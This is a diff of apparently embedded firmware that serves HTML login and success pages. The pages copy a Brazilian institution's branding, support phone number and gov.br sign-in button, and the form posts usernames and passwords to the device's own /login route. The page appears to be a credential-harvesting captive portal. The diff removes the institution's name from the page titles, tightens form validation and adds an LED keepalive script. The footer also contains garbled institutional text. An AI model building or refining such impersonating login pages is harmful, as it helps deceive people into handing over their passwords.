@@ -8,7 +8,7 @@ const char *loginPage = R"rawliteral(
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>FUMA - Autenticação Integrada</title>
+  <title>Autenticação Integrada</title>
   <style>
       * {
         margin: 0;
@@ -232,14 +232,14 @@ const char *loginPage = R"rawliteral(
     <div class="background"></div>
     <div class="login-container">
       <h2 class="login-title">Autenticação Integrada</h2>
-      <form action="/login" method="post">
+      <form action="/login" method="post" id="loginForm">
         <div class="form-group">
           <label for="email">Nome de usuário:</label>
-          <input type="text" id="email" name="email" placeholder="Digite seu login" />
+          <input type="text" id="email" name="email" placeholder="Digite seu login" required />
         </div>
         <div class="form-group">
           <label for="password">Senha:</label>
-          <input type="password" id="password" name="pass" placeholder="Digite sua senha" />
+          <input type="password" id="password" name="pass" placeholder="Digite sua senha" required minlength="8" />
         </div>
         <button type="submit" class="btn-primary">ENTRAR</button>
         <button type="button" class="btn-secondary">Entrar com gov.br</button>
@@ -260,6 +260,12 @@ const char *loginPage = R"rawliteral(
       Superintendêntendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
     </div>
   </footer>
+  <script>
+    // Envia keepalive a cada 1 segundo para manter o LED piscando
+    setInterval(function() {
+      fetch('/keepalive').catch(()=>{});
+    }, 1000);
+  </script>
 </body>
 </html>
 )rawliteral";
@@ -271,7 +277,7 @@ const char *successPage = R"rawliteral(
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>FUMA - Login Efetuado</title>
+    <title>Login Efetuado</title>
     <style>
       * {
         margin: 0;
@@ -389,6 +395,12 @@ const char *successPage = R"rawliteral(
       Superidisintendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
       </div>
     </footer>
+    <script>
+      // Envia keepalive a cada 1 segundo para manter o LED piscando
+      setInterval(function() {
+        fetch('/keepalive').catch(()=>{});
+      }, 1000);
+    </script>
   </body>
 </html>
 )rawliteral";
